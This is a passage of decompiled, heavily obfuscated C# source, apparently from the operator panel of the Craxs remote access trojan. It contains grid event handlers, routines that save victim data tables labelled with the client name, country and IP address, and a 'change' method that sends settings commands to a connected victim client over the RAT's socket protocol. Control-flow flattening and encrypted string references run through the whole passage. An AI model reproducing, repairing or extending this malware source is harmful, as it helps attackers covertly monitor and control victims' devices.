              int num4 = Microsoft.VisualBasic.CompilerServices.Operators.CompareString(current.Name, DG0.Name, false) == 0 ? 1873426044 : (num4 = -1248899725);
              num1 = num4 ^ (int) num2 * -482816559;
              continue;
            case 6:
              goto label_6;
            default:
              goto label_8;
          }
        }
label_12:
        return;
label_8:;
      }
      finally
      {
        if (enumerator != null)
        {
label_10:
          int num5 = 1725841037;
          while (true)
          {
            uint num6;
            switch ((num6 = (uint) (~(((num5 ^ ~~(-1984061581 - -685009755 - -650554275 ^ -~1079073981)) + (76701685 - 1235720543 + (154249879 - ((1287352004 ^ 1785151029) - 1102263251 * -27993383)))) * 2002700831) * 2123738143 - 284650937)) % 3U)
            {
              case 1:
                enumerator.Dispose();
                num5 = (int) num6 * 2073119276 ^ -1078388131;
                continue;
              case 2:
                goto label_10;
              default:
                goto label_14;
            }
          }
        }
label_14:;
      }
    }

    private void DGV0_CellEnter(object sender, DataGridViewCellEventArgs e)
    {
      this.ClearSEL(this.DGV0);
    }

    private void DGV1_CellEnter(object sender, DataGridViewCellEventArgs e)
    {
      this.ClearSEL(this.DGV1);
    }

    private void DGV2_CellEnter(object sender, DataGridViewCellEventArgs e)
    {
      this.ClearSEL(this.DGV2);
    }

    private void DGV3_CellEnter(object sender, DataGridViewCellEventArgs e)
    {
      this.ClearSEL(this.DGV3);
    }

    private void DGV4_CellEnter(object sender, DataGridViewCellEventArgs e)
    {
      this.ClearSEL(this.DGV4);
    }

    private void DGV5_CellEnter(object sender, DataGridViewCellEventArgs e)
    {
      this.ClearSEL(this.DGV5);
    }

    private void DGV6_CellEnter(object sender, DataGridViewCellEventArgs e)
    {
      this.ClearSEL(this.DGV6);
    }

    private void DGV5_CellBeginEdit(object sender, DataGridViewCellCancelEventArgs e)
    {
      ((LocationManager) this).EventName = EXGuarder.\u003161C7352;
label_1:
      int num1 = 1506236163;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ~(~(num1 * 1958433985 * -1031118885 ^ -1705633551) * -719228221)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_3;
          case 2:
            ((LocationManager) this).EventArgs = e;
            num1 = (int) num2 * 544387583 ^ -736930453;
            continue;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    private void DGV6_CellBeginEdit(object sender, DataGridViewCellCancelEventArgs e)
    {
      ((LocationManager) this).EventName = EXGuarder.\u0031346710D;
label_1:
      int num1 = -94656858;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 * -803544595 - 638620711 * ((1621585418 * 1800097105 ^ 214862301 * -1691207355) * -141975029) + ~-(1701238139 * 861493099) - (-1358940782 * -551697497 ^ ~-1600974248) - --820419634 - -1798520870)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_3;
          case 2:
            ((LocationManager) this).EventArgs = e;
            num1 = (int) num2 * 714602385 ^ -1013883374;
            continue;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    private void SaveToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (((LocationManager) this).tmpTable == null)
        return;
label_1:
      int num1 = 1499492587;
      while (true)
      {
        uint num2;
        WaitCallback callBack;
        switch ((num2 = (uint) -~(num1 - -((-1319061349 * 1400726858 + -172104419) * 1373159241 + (1071904419 * -1291481362 + (1921018390 - 1869011846) + ((-1514773861 ^ -1787349069) - (-1417054619 - -323699463)))))) % 7U)
        {
          case 0:
            goto label_1;
          case 1:
            ((LocationManager) this).DS = new DataSet(EXGuarder.\u003721B4764);
            num1 = (int) num2 * 1531085883 ^ -498407629;
            continue;
          case 2:
            if (LocationManager.\u0024IR163\u002D1 == null)
            {
              // ISSUE: reference to a compiler-generated method
              LocationManager.\u0024IR163\u002D1 = callBack = new WaitCallback(LocationManager.\u0024I._Lambda\u0024__R163\u002D1);
              break;
            }
            num1 = -967352155;
            continue;
          case 3:
            ((LocationManager) this).DS.Tables.Add(((LocationManager) this).tmpTable);
            num1 = (int) num2 * -1841894613 ^ 1413825365;
            continue;
          case 4:
            goto label_12;
          case 5:
            callBack = LocationManager.\u0024IR163\u002D1;
            break;
          case 6:
            reso.Directory_Exist(((LocationManager) this).classClient);
            int num3 = ((LocationManager) this).DS != null ? -824473996 : (num3 = 2070090648);
            num1 = num3 ^ (int) num2 * -11581334;
            continue;
          default:
            goto label_13;
        }
        ThreadPool.QueueUserWorkItem(callBack, (object) new object[8]
        {
          (object) ((LocationManager) this).DS,
          (object) ((LocationManager) this).tmpFolderUSER,
          (object) EXGuarder.\u00364343E0E,
          (object) ((LocationManager) this).tmpClientName,
          (object) (((LocationManager) this).tmpCountry + EXGuarder.\u00374194611 + ((LocationManager) this).tmpAddressIP),
          (object) EXGuarder.\u00364343E0E,
          (object) EXGuarder.\u003721B4764,
          (object) (DateAndTime.Now.ToString(EXGuarder.\u0031C3C4704) + EXGuarder.\u0035D67024E)
        });
        num1 = -1785751647;
      }
label_12:
      return;
label_13:;
    }

    private void SaveAsToolStripMenuItem_Click(object sender, EventArgs e)
    {
      SaveFileDialog saveFileDialog = new SaveFileDialog();
label_1:
      int num1 = 562954819;
      while (true)
      {
        uint num2;
        WaitCallback callBack;
        switch ((num2 = (uint) -((~~num1 ^ ~-~175211045) * -1390150759 * 1020518639)) % 11U)
        {
          case 0:
            saveFileDialog.Filter = EXGuarder.\u00314244C68;
            num1 = (int) num2 * -985746707 ^ -121376208;
            continue;
          case 1:
            int num3 = ((LocationManager) this).DS != null ? -1850210430 : (num3 = -1875511923);
            num1 = num3 ^ (int) num2 * -123898266;
            continue;
          case 2:
            goto label_1;
          case 3:
            callBack = LocationManager.\u0024IR164\u002D2;
            break;
          case 4:
            int num4 = saveFileDialog.ShowDialog() != DialogResult.OK ? -1453878245 : (num4 = -1747566819);
            num1 = num4 ^ (int) num2 * -252291643;
            continue;
          case 5:
            ((LocationManager) this).DS.Tables.Add(((LocationManager) this).tmpTable);
            num1 = (int) num2 * 28403536 ^ -1932660702;
            continue;
          case 6:
            ((LocationManager) this).DS = new DataSet(EXGuarder.\u003395B6312);
            num1 = (int) num2 * 1383242517 ^ 520531750;
            continue;
          case 7:
            saveFileDialog.FileName = DateAndTime.Now.ToString(EXGuarder.\u0030E4E383F) + EXGuarder.\u0032C5C5473;
            num1 = (int) num2 * -1288040149 ^ 1037056326;
            continue;
          case 8:
            if (LocationManager.\u0024IR164\u002D2 == null)
            {
              // ISSUE: reference to a compiler-generated method
              callBack = LocationManager.\u0024IR164\u002D2 = new WaitCallback(LocationManager.\u0024I._Lambda\u0024__R164\u002D2);
              break;
            }
            num1 = -1905931937;
            continue;
          case 9:
            saveFileDialog.Dispose();
            num1 = 646000119;
            continue;
          case 10:
            goto label_3;
          default:
            goto label_16;
        }
        object[] state = new object[8]
        {
          (object) ((LocationManager) this).DS,
          (object) EXGuarder.\u00303381F1A,
          (object) saveFileDialog.FileName,
          (object) ((LocationManager) this).tmpClientName,
          (object) (((LocationManager) this).tmpCountry + EXGuarder.\u003092B3867 + ((LocationManager) this).tmpAddressIP),
          (object) EXGuarder.\u0034B595A6B,
          (object) EXGuarder.\u003395B6312,
          (object) EXGuarder.\u00303381F1A
        };
        ThreadPool.QueueUserWorkItem(callBack, (object) state);
        num1 = -321374297;
      }
label_3:
      return;
label_16:;
    }

    private void ComboBox_SelectedIndexChanged(object sender, EventArgs e)
    {
      ComboBox comboBox = (ComboBox) sender;
label_1:
      int num1 = 1512424576;
      string eventName;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (-(num1 * 128933455) - 2104613085 * --3198644)) % 24U)
        {
          case 0:
            int num3;
            num1 = num3 = !(((LocationManager) this).EventArgs.ColumnIndex == 1 & ((LocationManager) this).EventArgs.RowIndex == 0) ? 709351069 : (num3 = 1430700750);
            continue;
          case 1:
            int num4;
            num1 = num4 = !(((LocationManager) this).EventArgs.ColumnIndex == 1 & ((LocationManager) this).EventArgs.RowIndex == 3) ? 1704702096 : (num4 = -32510061);
            continue;
          case 2:
            this.change(EXGuarder.\u00303162008, Conversions.ToString(comboBox.SelectedIndex));
            num1 = (int) num2 * -1588390055 ^ -1667605424;
            continue;
          case 3:
            int num5 = ((LocationManager) this).EventArgs == null ? -1023104033 : (num5 = -1603793680);
            num1 = num5 ^ (int) num2 * 1764782797;
            continue;
          case 4:
            int num6 = comboBox == null ? -32439944 : (num6 = -1527287527);
            num1 = num6 ^ (int) num2 * -1118095946;
            continue;
          case 5:
            eventName = ((LocationManager) this).EventName;
            num1 = (int) num2 * -1930221880 ^ -2058254562;
            continue;
          case 6:
            goto label_1;
          case 7:
            this.change(EXGuarder.\u003241F725A, Conversions.ToString(comboBox.SelectedIndex));
            num1 = (int) num2 * -1703483824 ^ -1808843488;
            continue;
          case 8:
            int num7 = !(((LocationManager) this).EventArgs.ColumnIndex == 1 & ((LocationManager) this).EventArgs.RowIndex == 0) ? -1333032006 : (num7 = 163979486);
            num1 = num7 ^ (int) num2 * 1684594297;
            continue;
          case 9:
            int num8;
            num1 = num8 = !(((LocationManager) this).EventArgs.ColumnIndex == 1 & ((LocationManager) this).EventArgs.RowIndex == 2) ? -1272118051 : (num8 = -239103104);
            continue;
          case 10:
            int num9 = Microsoft.VisualBasic.CompilerServices.Operators.CompareString(eventName, EXGuarder.\u0034F506633, false) == 0 ? -1612713064 : (num9 = -2049855493);
            num1 = num9 ^ (int) num2 * -30744782;
            continue;
          case 11:
            int num10 = !(((LocationManager) this).EventArgs.ColumnIndex != -1 & ((LocationManager) this).EventArgs.RowIndex != -1 & Microsoft.VisualBasic.CompilerServices.Operators.CompareString(((LocationManager) this).EventName, (string) null, false) != 0) ? 1680796629 : (num10 = -538750724);
            num1 = num10 ^ (int) num2 * 1922079695;
            continue;
          case 12:
            goto label_3;
          case 13:
            int num11 = comboBox.Text.Length <= 0 ? 1040489101 : (num11 = 1468307842);
            num1 = num11 ^ (int) num2 * -2066108063;
            continue;
          case 14:
            num1 = (int) num2 * 710684021 ^ -400364170;
            continue;
          case 15:
            this.change(EXGuarder.\u0033A766827, Conversions.ToString(comboBox.SelectedIndex));
            num1 = (int) num2 * -815291916 ^ 893944636;
            continue;
          case 16:
            num1 = (int) num2 * 176224571 ^ 388929368;
            continue;
          case 17:
            int num12;
            num1 = num12 = !(((LocationManager) this).EventArgs.ColumnIndex == 1 & ((LocationManager) this).EventArgs.RowIndex == 1) ? -2000970939 : (num12 = -616728741);
            continue;
          case 18:
            this.change(EXGuarder.\u00300234C56, Conversions.ToString(comboBox.SelectedIndex));
            num1 = (int) num2 * -295765905 ^ 1912324973;
            continue;
          case 19:
            int num13 = Microsoft.VisualBasic.CompilerServices.Operators.CompareString(eventName, EXGuarder.\u003336E550C, false) != 0 ? -1299242938 : (num13 = 1509919674);
            num1 = num13 ^ (int) num2 * -1127022206;
            continue;
          case 20:
            this.change(EXGuarder.\u003493F6E00, Conversions.ToString(comboBox.SelectedIndex));
            num1 = (int) num2 * -9604478 ^ -799319868;
            continue;
          case 21:
            this.change(EXGuarder.\u0033F437076, Conversions.ToString(comboBox.SelectedIndex));
            num1 = (int) num2 * 1479170444 ^ -1987149172;
            continue;
          case 22:
            int num14;
            num1 = num14 = !(((LocationManager) this).EventArgs.ColumnIndex == 1 & ((LocationManager) this).EventArgs.RowIndex == 1) ? 1704702096 : (num14 = -1904858047);
            continue;
          case 23:
            num1 = (int) num2 * -1820311536 ^ 747345632;
            continue;
          default:
            goto label_26;
        }
      }
label_3:
      return;
label_26:;
    }

    private void change(string num, string vul)
    {
      if (((LocationManager) this).classClient == null)
        return;
label_1:
      int num1 = -1184747842;
      object[] ParametersObjects;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (~(~((num1 - ~-(--295611147 ^ -215547579 * -1696983119 - 2122954089 * 1853379819)) * 1403757427) - (786958295 * 581268133 - ~1002697003)) ^ -332036168)) % 4U)
        {
          case 0:
            ((LocationManager) this).classClient.SendMessage(ParametersObjects);
            num1 = (int) num2 * 270120858 ^ 1589635924;
            continue;
          case 1:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ParametersObjects = new object[4]
            {
              (object) ((LocationManager) this).Client,
              (object) (Client.KeysClient1 + Craxs_Rat.sockets.Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Settings.domen + EXGuarder.\u003292F2410 + Craxs_Rat.sockets.Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0031A0B7840 + Craxs_Rat.sockets.Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Client.resultClient + Craxs_Rat.sockets.Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + num + Craxs_Rat.sockets.Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + vul),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u0036F48455F),
              (object) ((LocationManager) this).classClient
            };
            num1 = (int) num2 * 701707429 ^ -1464430382;
            continue;
          case 2:
            goto label_1;
          case 3:
            goto label_6;
          default:
            goto label_7;
        }
      }
label_6:
      return;
label_7:;
    }

    private void DGV5_EditingControlShowing(
      object sender,
      DataGridViewEditingControlShowingEventArgs e)
    {
      ComboBox control = (ComboBox) e.Control;
label_1:
      int num1 = -1191179635;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (-(num1 - -~(-(2128360591 - 818992473) ^ ~(-1175433155 - 1222476748)) ^ -1333697280) - ~(345772677 - 738113616) + (-1856825499 - 527990030) ^ -1896441897)) % 6U)
        {
          case 0:
            ((LocationManager) this).LastComboDGV5 = control;
            ((LocationManager) this).LastComboDGV5.SelectionChangeCommitted += new EventHandler(this.ComboBox_SelectedIndexChanged);
            num1 = 1854121456;
            continue;
          case 1:
            ((LocationManager) this).LastComboDGV5.SelectionChangeCommitted -= new EventHandler(this.ComboBox_SelectedIndexChanged);
            num1 = (int) num2 * 1044653375 ^ 891606248;
            continue;
          case 2:
            int num3 = Information.IsNothing(RuntimeHelpers.GetObjectValue(control.SelectedItem)) ? -144996396 : (num3 = -1064579522);
            num1 = num3 ^ (int) num2 * -1609891966;
            continue;
          case 3:
            goto label_3;
          case 4:
            goto label_1;
          case 5:
            int num4 = Information.IsNothing((object) ((LocationManager) this).LastComboDGV5) ? -1990313509 : (num4 = 1939047568);
            num1 = num4 ^ (int) num2 * -1801693852;
            continue;
          default:
            goto label_8;
        }
      }
label_3:
      return;
label_8:;
    }

    private void DGV6_EditingControlShowing(
      object sender,
      DataGridViewEditingControlShowingEventArgs e)
    {
      ComboBox control = (ComboBox) e.Control;
label_1:
      int num1 = 115042533;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ((--(num1 ^ -1453955803 * -1567558718 ^ ~(~(-785438912 - 542392056) + (-1565891126 - -714208039 - ~518098063))) + (~1192683095 - -1715506309 * -189535152)) * 871680389 - 1349374046)) % 7U)
        {
          case 0:
            ((LocationManager) this).LastComboDGV6 = control;
            num1 = 1946529270;
            continue;
          case 1:
            goto label_3;
          case 2:
            ((LocationManager) this).LastComboDGV6.SelectionChangeCommitted += new EventHandler(this.ComboBox_SelectedIndexChanged);
            num1 = (int) num2 * -1057104462 ^ -614446545;
            continue;
          case 3:
            int num3 = Information.IsNothing(RuntimeHelpers.GetObjectValue(control.SelectedItem)) ? -1103410879 : (num3 = -879970009);
            num1 = num3 ^ (int) num2 * 897807886;
            continue;
          case 4:
            goto label_1;
          case 5:
            int num4 = Information.IsNothing((object) ((LocationManager) this).LastComboDGV6) ? 1388275621 : (num4 = -561073980);
            num1 = num4 ^ (int) num2 * -189968379;
            continue;
          case 6:
            ((LocationManager) this).LastComboDGV6.SelectionChangeCommitted -= new EventHandler(this.ComboBox_SelectedIndexChanged);
            num1 = (int) num2 * -1609037318 ^ 1115190475;
            continue;
          default:
            goto label_9;
        }
      }
label_3:
      return;
label_9:;
    }

    public information()
    {
    }

    static information()
    {
      LocationManager.\u0024I = (information._Closure\u0024__) new information();
    }
  }
}
